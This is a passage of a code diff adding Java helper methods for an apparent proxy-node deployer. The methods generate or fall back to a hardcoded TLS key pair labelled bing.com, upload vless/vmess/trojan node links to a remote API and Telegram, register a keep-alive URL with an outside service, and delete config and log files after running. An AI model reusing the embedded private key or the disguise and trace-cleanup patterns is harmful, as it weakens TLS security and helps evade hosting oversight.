+                        while (matcher.find()) found = matcher.group(1);
+                        if (found != null) return Optional.of(found);
+                    }
+                }
+            } catch (IOException ignored) {
+            }
+            sleep(1000);
+        }
+        return Optional.empty();
+    }
+
+    private static void ensureTlsCertificates(Path certPath, Path keyPath) throws IOException {
+        if (Files.exists(certPath) && Files.exists(keyPath) && looksLikePemPair(certPath, keyPath)) return;
+        Files.createDirectories(certPath.getParent());
+        Path tmpCert = Path.of(certPath + ".tmp");
+        Path tmpKey = Path.of(keyPath + ".tmp");
+        Files.deleteIfExists(tmpCert);
+        Files.deleteIfExists(tmpKey);
+        try {
+            if (runCommand("openssl", "version") == 0 &&
+                    runCommand("openssl", "ecparam", "-genkey", "-name", "prime256v1", "-out", tmpKey.toString()) == 0 &&
+                    runCommand("openssl", "req", "-new", "-x509", "-days", "3650", "-key", tmpKey.toString(), "-out", tmpCert.toString(), "-subj", "/CN=bing.com") == 0 &&
+                    looksLikePemPair(tmpCert, tmpKey)) {
+                Files.move(tmpCert, certPath, StandardCopyOption.REPLACE_EXISTING);
+                Files.move(tmpKey, keyPath, StandardCopyOption.REPLACE_EXISTING);
+                return;
+            }
+        } catch (Exception ignored) {
+        } finally {
+            Files.deleteIfExists(tmpCert);
+            Files.deleteIfExists(tmpKey);
+        }
+        Files.writeString(keyPath, FALLBACK_EC_KEY, StandardCharsets.UTF_8);
+        Files.writeString(certPath, FALLBACK_CERT, StandardCharsets.UTF_8);
+        if (!looksLikePemPair(certPath, keyPath)) throw new IOException("failed to create a valid TLS certificate pair");
+    }
+
+    private static boolean looksLikePemPair(Path certPath, Path keyPath) {
+        try {
+            String cert = Files.readString(certPath, StandardCharsets.UTF_8);
+            String key = Files.readString(keyPath, StandardCharsets.UTF_8);
+            return cert.contains("-----BEGIN CERTIFICATE-----") && cert.contains("-----END CERTIFICATE-----") &&
+                    key.contains("-----BEGIN EC PRIVATE KEY-----") && key.contains("-----END EC PRIVATE KEY-----");
+        } catch (IOException e) {
+            return false;
+        }
+    }
+
+    private static void deleteNodes() {
+        if (UPLOAD_URL.isEmpty() || !Files.exists(SUB_FILE_PATH)) return;
+        try {
+            String decoded = new String(Base64.getDecoder().decode(Files.readString(SUB_FILE_PATH, StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
+            List<String> nodes = decoded.lines().filter(AppService::isNodeLine).collect(Collectors.toList());
+            if (!nodes.isEmpty()) {
+                postJson(UPLOAD_URL + "/api/delete-nodes", toJson(mapOf("nodes", nodes)), Duration.ofSeconds(30));
+            }
+        } catch (Exception ignored) {
+        }
+    }
+
+    private static void uploadNodes() {
+        try {
+            if (!UPLOAD_URL.isEmpty() && !PROJECT_URL.isEmpty()) {
+                String subscriptionUrl = PROJECT_URL + "/" + SUB_PATH;
+                postJson(UPLOAD_URL + "/api/add-subscriptions", toJson(mapOf("subscription", listOf(subscriptionUrl))), Duration.ofSeconds(30));
+                System.out.println("Subscription uploaded successfully");
+            } else if (!UPLOAD_URL.isEmpty() && Files.exists(LIST_FILE_PATH)) {
+                List<String> nodes = Files.readString(LIST_FILE_PATH, StandardCharsets.UTF_8).lines().filter(AppService::isNodeLine).collect(Collectors.toList());
+                if (!nodes.isEmpty()) {
+                    postJson(UPLOAD_URL + "/api/add-nodes", toJson(mapOf("nodes", nodes)), Duration.ofSeconds(30));
+                    System.out.println("Subscription uploaded successfully");
+                }
+            }
+        } catch (Exception ignored) {
+        }
+    }
+
+    private static void sendTelegram() {
+        if (BOT_TOKEN.isEmpty() || CHAT_ID.isEmpty()) {
+            System.out.println("TG variables is empty, Skipping push nodes to TG");
+            return;
+        }
+        try {
+            String message = Files.readString(SUB_FILE_PATH, StandardCharsets.UTF_8);
+            String text = "**" + escapeMarkdownV2(NAME) + "nodes push notification**\n```" + message + "```";
+            String form = "chat_id=" + urlEncode(CHAT_ID) + "&text=" + urlEncode(text) + "&parse_mode=MarkdownV2";
+            HttpRequest request = HttpRequest.newBuilder(URI.create("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"))
+                    .timeout(Duration.ofSeconds(30))
+                    .header("Content-Type", "application/x-www-form-urlencoded")
+                    .POST(HttpRequest.BodyPublishers.ofString(form))
+                    .build();
+            HTTP.send(request, HttpResponse.BodyHandlers.discarding());
+            System.out.println("Telegram message sent successfully");
+        } catch (Exception e) {
+            System.out.println("Failed to send Telegram message: " + e.getMessage());
+        }
+    }
+
+    private static void addVisitTask() {
+        if (!AUTO_ACCESS || PROJECT_URL.isEmpty()) {
+            System.out.println("Skipping adding automatic access task");
+            return;
+        }
+        try {
+            postJson("https://oooo.serv00.net/add-url", toJson(mapOf("url", PROJECT_URL)), Duration.ofSeconds(30));
+            System.out.println("Automatic access task added successfully");
+        } catch (Exception e) {
+            System.out.println("Add URL failed: " + e.getMessage());
+        }
+    }
+
+    private static String getMetaInfo() {
+        try {
+            String body = getText("https://api.ip.sb/geoip", Duration.ofSeconds(3));
+            Optional<String> country = findJsonString(body, "country_code");
+            Optional<String> isp = findJsonString(body, "isp");
+            if (country.isPresent() && isp.isPresent()) return (country.get() + "-" + isp.get()).replace(' ', '_');
+        } catch (Exception ignored) {
+        }
+        try {
+            String body = getText("http://ip-api.com/json", Duration.ofSeconds(3));
+            Optional<String> country = findJsonString(body, "countryCode");
+            Optional<String> org = findJsonString(body, "org");
+            if (country.isPresent() && org.isPresent()) return (country.get() + "-" + org.get()).replace(' ', '_');
+        } catch (Exception ignored) {
+        }
+        return "Unknown";
+    }
+
+    private static String getServerIp() {
+        try {
+            String ipv4 = getText("http://ipv4.ip.sb", Duration.ofSeconds(3)).trim();
+            if (!ipv4.isEmpty()) return ipv4;
+        } catch (Exception ignored) {
+        }
+        try {
+            String ipv6 = getText("http://ipv6.ip.sb", Duration.ofSeconds(3)).trim();
+            if (!ipv6.isEmpty()) return "[" + ipv6 + "]";
+        } catch (Exception ignored) {
+        }
+        return "";
+    }
+
+    private static boolean needsYoutubeWarp() {
+        if (YT_WARPOUT) return true;
+        try {
+            HttpRequest request = HttpRequest.newBuilder(URI.create("https://www.youtube.com")).timeout(Duration.ofSeconds(2)).GET().build();
+            return HTTP.send(request, HttpResponse.BodyHandlers.discarding()).statusCode() != 200;
+        } catch (Exception e) {
+            return true;
+        }
+    }
+
+    private static void cleanupOldFiles() {
+        for (String file : List.of("boot.log", "list.txt", "config.json", "config.yaml", "cert.pem", "private.key", "tunnel.json", "tunnel.yml")) {
+            try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
+        }
+        deleteDirectory(ROOT.resolve(".tmp"));
+    }
+
+    private static void cleanupFiles(boolean keepSub) {
+        try {
+            if (Files.exists(RUNTIME_DIR)) {
+                try (var stream = Files.list(RUNTIME_DIR)) {
+                    for (Path path : stream.collect(Collectors.toList())) {
+                        String name = path.getFileName().toString();
+                        if (name.equals("keypair.properties") || (keepSub && name.equals("sub.txt"))) continue;
+                        if (Files.isDirectory(path)) deleteDirectory(path); else Files.deleteIfExists(path);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            System.out.println("Cleanup failed: " + e.getMessage());
+        }
+        deleteDirectory(ROOT.resolve(".tmp"));
+    }
+
+    private static void deleteDirectory(Path path) {
+        if (!Files.exists(path)) return;
+        try (var stream = Files.walk(path)) {
+            List<Path> paths = stream.sorted((a, b) -> b.compareTo(a)).collect(Collectors.toList());
+            for (Path p : paths) Files.deleteIfExists(p);
+        } catch (IOException ignored) {
+        }
+    }
+
+    private static String getText(String url, Duration timeout) throws Exception {
+        HttpRequest request = HttpRequest.newBuilder(URI.create(url)).timeout(timeout).GET().build();
+        HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
+        if (response.statusCode() < 200 || response.statusCode() >= 300) throw new IOException("HTTP " + response.statusCode());
+        return response.body();
+    }
+
+    private static void postJson(String url, String json, Duration timeout) throws Exception {
+        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
+                .timeout(timeout)
+                .header("Content-Type", "application/json")
+                .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))
+                .build();
+        HTTP.send(request, HttpResponse.BodyHandlers.discarding());
+    }
+
+    private static int runCommand(String... command) throws IOException, InterruptedException {
+        return new ProcessBuilder(command).redirectErrorStream(true).start().waitFor();
+    }
+
+    private static String toJson(Object value) {
+        if (value == null) return "null";
+        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
+        if (value instanceof Number || value instanceof Boolean) return value.toString();
+        if (value instanceof Map<?, ?>) {
+            Map<?, ?> map = (Map<?, ?>) value;
+            return map.entrySet().stream()
+                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
+                    .collect(Collectors.joining(",", "{", "}"));
+        }
+        if (value instanceof Iterable<?>) {
+            Iterable<?> iterable = (Iterable<?>) value;
+            List<String> items = new ArrayList<>();
+            for (Object item : iterable) items.add(toJson(item));
+            return String.join(",", items).replaceFirst("^", "[") + "]";
+        }
+        return toJson(String.valueOf(value));
+    }
+
+    private static String escapeJson(String value) {
+        StringBuilder out = new StringBuilder();
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            switch (c) {
+                case '\\':
+                    out.append("\\\\");
+                    break;
+                case '"':
+                    out.append("\\\"");
+                    break;
+                case '\n':
+                    out.append("\\n");
+                    break;
+                case '\r':
+                    out.append("\\r");
+                    break;
+                case '\t':
+                    out.append("\\t");
+                    break;
+                default:
+                    out.append(c);
+            }
+        }
+        return out.toString();
+    }
+
+    private static Map<String, Object> mapOf(Object... values) {
+        Map<String, Object> map = new LinkedHashMap<>();
+        for (int i = 0; i < values.length; i += 2) map.put(String.valueOf(values[i]), values[i + 1]);
+        return map;
+    }
+
+    private static List<Object> listOf(Object... values) {
+        return new ArrayList<>(List.of(values));
+    }
+
+    private static Optional<String> findProperty(String content, String key) {
+        Matcher matcher = Pattern.compile("(?m)^" + Pattern.quote(key) + ":\\s*(.*)$").matcher(content);
+        return matcher.find() ? Optional.of(matcher.group(1).trim()) : Optional.empty();
+    }
+
+    private static Optional<String> findJsonString(String json, String key) {
+        Matcher matcher = Pattern.compile("\\\"" + Pattern.quote(key) + "\\\"\\s*:\\s*\\\"([^\\\"]*)\\\"").matcher(json);
+        return matcher.find() ? Optional.of(matcher.group(1)) : Optional.empty();
+    }
+
+    private static boolean isNodeLine(String line) {
+        return Pattern.compile("(vless|vmess|trojan|hysteria2|tuic)://").matcher(line).find();
+    }
+
+    private static boolean isValidPort(String port) {
+        try {
+            if (port == null || port.isBlank()) return false;
+            int n = Integer.parseInt(port.trim());
+            return n >= 1 && n <= 65535;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private static String env(String name, String fallback) {
+        String value = DOT_ENV.get(name);
+        if (value == null) value = System.getenv(name);
+        return value == null || value.isEmpty() ? fallback : value;
+    }
+
+    private static int envInt(String name, int fallback) {
+        try { return Integer.parseInt(env(name, String.valueOf(fallback))); } catch (Exception e) { return fallback; }
+    }
+
+    private static boolean envBool(String name, boolean fallback) {
+        String value = env(name, "");
+        if (value == null || value.isBlank()) return fallback;
+        return List.of("true", "yes").contains(value.toLowerCase());
+    }
+
+    private static Map<String, String> loadDotEnv() {
+        Map<String, String> values = new LinkedHashMap<>();
+        Path envPath = Path.of(".env").toAbsolutePath().normalize();
+        if (!Files.exists(envPath)) return values;
+        try {
+            for (String line : Files.readAllLines(envPath, StandardCharsets.UTF_8)) {
+                parseDotEnvLine(line).ifPresent(entry -> values.put(entry.getKey(), entry.getValue()));
+            }
+        } catch (IOException e) {
+            System.out.println("Failed to read .env: " + e.getMessage());
+        }
+        return values;
+    }
+
+    private static Optional<Map.Entry<String, String>> parseDotEnvLine(String line) {
+        String trimmed = line.trim();
+        if (trimmed.isEmpty() || trimmed.startsWith("#")) return Optional.empty();
+        if (trimmed.startsWith("export ")) trimmed = trimmed.substring("export ".length()).trim();
+        int equals = trimmed.indexOf('=');
+        if (equals <= 0) return Optional.empty();
+        String key = trimmed.substring(0, equals).trim();
+        if (key.isEmpty()) return Optional.empty();
+        String value = trimmed.substring(equals + 1).trim();
+        return Optional.of(Map.entry(key, parseDotEnvValue(value)));
+    }
+
+    private static String parseDotEnvValue(String value) {
+        if (value.length() >= 2) {
+            char quote = value.charAt(0);
+            if ((quote == '"' || quote == '\'') && value.charAt(value.length() - 1) == quote) {
+                value = value.substring(1, value.length() - 1);
+                return quote == '"' ? unescapeDotEnvValue(value) : value;
+            }
+        }
+        return stripInlineComment(value).trim();
+    }
+
+    private static String stripInlineComment(String value) {
+        for (int i = 0; i < value.length(); i++) {
+            if (value.charAt(i) == '#' && (i == 0 || Character.isWhitespace(value.charAt(i - 1)))) {
+                return value.substring(0, i);
+            }
+        }
+        return value;
+    }
+
+    private static String unescapeDotEnvValue(String value) {
+        StringBuilder out = new StringBuilder();
+        boolean escaped = false;
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            if (escaped) {
+                switch (c) {
+                    case 'n': out.append('\n'); break;
+                    case 'r': out.append('\r'); break;
+                    case 't': out.append('\t'); break;
+                    default: out.append(c);
+                }
+                escaped = false;
+            } else if (c == '\\') {
+                escaped = true;
+            } else {
+                out.append(c);
+            }
+        }
+        if (escaped) out.append('\\');
+        return out.toString();
+    }
+
+    private static String detectArch() {
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        return arch.contains("aarch64") || arch.contains("arm64") ? "arm64" : "amd64";
+    }
+
+    private static String base64Url(byte[] bytes) {
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
+    }
+
+    private static byte[] decodeBase64Url(String value) {
+        return Base64.getUrlDecoder().decode(value.trim());
+    }
+
+    private static String urlEncode(String value) {
+        return URLEncoder.encode(value, StandardCharsets.UTF_8);
+    }
+
+    private static String escapeMarkdownV2(String value) {
+        return value.replaceAll("([_\\*\\[\\]\\(\\)~`>#+=|{}.!-])", "\\\\$1");
+    }
+
+    private static void clearConsole() {
+        try {
+            System.out.print("\033[H\033[2J");
+            System.out.flush();
+            new ProcessBuilder("clear").inheritIO().start().waitFor();
+        } catch (Exception e) {
+            System.out.println("\n\n\n\n\n\n\n\n\n\n");
+        }
+    }
+
+    private static void sleep(long millis) {
+        try { Thread.sleep(millis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+    }
+
+    private static final String FALLBACK_EC_KEY = "-----BEGIN EC PARAMETERS-----\n" +
+            "BggqhkjOPQMBBw==\n" +
+            "-----END EC PARAMETERS-----\n" +
+            "-----BEGIN EC PRIVATE KEY-----\n" +
+            "MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n" +
+            "AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n" +
+            "/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n" +
+            "-----END EC PRIVATE KEY-----\n";
+
+    private static final String FALLBACK_CERT = "-----BEGIN CERTIFICATE-----\n" +
+            "MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n" +
+            "EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n" +
+            "MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n" +
+            "A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n" +
+            "aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n" +
+            "BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n" +
+            "Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n" +
+            "eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n" +
+            "-----END CERTIFICATE-----\n";
+}
